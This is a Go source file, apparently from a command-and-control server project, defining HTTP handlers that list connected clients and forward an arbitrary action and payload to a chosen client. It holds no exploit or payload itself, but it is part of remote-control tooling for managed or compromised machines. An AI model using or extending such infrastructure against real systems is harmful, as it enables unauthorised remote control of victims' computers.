package api

import (
	"encoding/json"
	"net/http"

	"hermes_spectre/c2_server/internal/services"

	"github.com/gin-gonic/gin"
)

// CommandRequest represents a command to be sent to a client
type CommandRequest struct {
	ClientID string `json:"client_id" binding:"required"`
	Action   string `json:"action" binding:"required"`
	Payload  string `json:"payload" binding:"required"`
}

// CommandHandler handles sending commands to connected clients
func CommandHandler(clientManager services.ClientManager) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req CommandRequest
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		// Check if client exists
		clients := clientManager.GetClients()
		_, exists := clients[req.ClientID]
		if !exists {
			c.JSON(http.StatusNotFound, gin.H{"error": "Client not found"})
			return
		}

		// Create the command message
		command := map[string]string{
			"action":  req.Action,
			"payload": req.Payload,
		}

		// Convert command to JSON and send to the client
		commandJSON, err := json.Marshal(command)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to marshal command: " + err.Error()})
			return
		}
		
		err = clientManager.SendToClient(req.ClientID, commandJSON)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{"status": "Command sent successfully"})
	}
}

// ClientsHandler returns a list of connected clients
func ClientsHandler(clientManager services.ClientManager) gin.HandlerFunc {
	return func(c *gin.Context) {
		clients := clientManager.GetClients()
		c.JSON(http.StatusOK, gin.H{"clients": clients})
	}
}